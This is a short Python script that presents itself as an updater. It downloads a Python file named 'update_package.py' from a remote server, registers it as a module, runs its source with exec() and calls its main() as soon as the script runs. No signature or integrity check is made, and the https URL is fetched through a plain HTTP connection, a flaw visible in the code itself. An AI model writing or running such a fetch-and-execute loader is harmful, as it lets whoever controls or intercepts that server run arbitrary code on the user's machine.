import sys
import types
import http.client
from urllib.parse import urlparse

def get_module_name():
    return "update_target"

def get_source_code_and_exec(url, module_name):
    parsed_url = urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)
    conn.request("GET", parsed_url.path)
    response = conn.getresponse()
    source = response.read().decode('utf-8')

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)

    return module

def execute():
    url = "https://secure.serverhub.com/utils/update_package.py"
    module_name = get_module_name()

    module = get_source_code_and_exec(url, module_name)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
